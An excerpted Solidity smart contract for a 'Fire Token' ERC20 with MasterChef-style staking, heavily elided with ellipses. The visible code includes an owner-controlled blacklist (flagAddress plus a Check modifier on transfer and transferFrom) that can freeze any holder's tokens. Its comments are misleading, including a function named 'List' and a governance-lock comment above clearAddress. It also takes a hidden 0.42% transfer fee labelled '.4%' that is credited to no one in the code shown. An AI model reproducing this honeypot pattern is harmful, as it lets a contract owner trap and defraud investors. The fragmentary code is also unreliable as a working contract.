...
abstract contract Ownable is Context {
    ...
    mapping(address => bool) internal _flag;
     ...
     */
    function maker() public view virtual returns (address) {
        return _maker;
    }
    /**
     * @dev Returns true/false if address is banned
     */
    function List(address _address) internal view virtual returns (bool) {
        return _flag[_address];
    }
     ...
     */
    modifier Maker() {
        require(maker() == _msgSender(), "Ownable: caller is not governance");
        _;
    }
     ...
     */
    modifier Check(address _address) {
    require(List(_address) != true);
        _;
    }
     ...
     */
    function flagAddress(address _address) external onlyOwner validAddress(_address){
        _flag[_address] = true;
    }
     ...
     * @dev Set block number to lock governance until.
     */
    function clearAddress(address _address) external onlyOwner validAddress(_address){
        _flag[_address] = false;
    }
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    public override Check(_msgSender()) returns (bool) {
    ...
    function transferFrom(
        ...
        address recipient,
        uint256 amount
    ) public override Check(sender) returns (bool) {
    ...
    function _transfer(
        ...
        uint f =  (amount * 420) / 100000; // Fixed .4%
        _balances[sender] = _balances[sender].sub(amount, 'ERC20: transfer amount exceeds balance');
        _balances[recipient] = _balances[recipient].add(amount-f);
        emit Transfer(sender, recipient, amount-f);
    }
...
contract MasterChefV3 is ERC20('Fire Token', 'Fire'), ReentrancyGuard {
    ...
    // The block number when fire mining ends.
    ...
    constructor(
        ...
        fire = Fire(address(this));
        feeAddress = msg.sender;
        eggPerBlock = _firePerBlock;
    ...
    function pendingEgg(uint256 _pid, address _user) external view returns (uint256) {
        ...
        if (block.number > pool.lastRewardBlock && pool.lpSupply != 0) {
            ...
            uint256 fireReward = (multiplier * eggPerBlock * pool.allocPoint) / totalAllocPoint;
            accfirePerShare = accfirePerShare + ((fireReward * 1e12) / pool.lpSupply);
        }

        return ((user.amount * accfirePerShare) /  1e12) - user.rewardDebt;
    }
    ...
    function updatePool(uint256 _pid) public {
        ...
        uint256 fireReward = (multiplier * eggPerBlock * pool.allocPoint) / totalAllocPoint;
            ...
            super._mint(address(this),fireReward);


        pool.accfirePerShare = pool.accfirePerShare + ((fireReward * 1e12) / pool.lpSupply);
        pool.lastRewardBlock = block.number;
    }
    ...
    function deposit(uint256 _pid, uint256 _amount) external nonReentrant {
       ...
       massUpdatePools();
        if (user.amount > 0) {
            uint256 pending = ((user.amount * pool.accfirePerShare) / 1e12) - user.rewardDebt;
            if (pending > 0) {
        ...
        user.rewardDebt = (user.amount * pool.accfirePerShare) / 1e12;
...
contract Fire is MasterChefV3(250000000, 1){
    
    constructor(uint startSupply) public {
    _mint(msg.sender, startSupply * 10 ** 18);
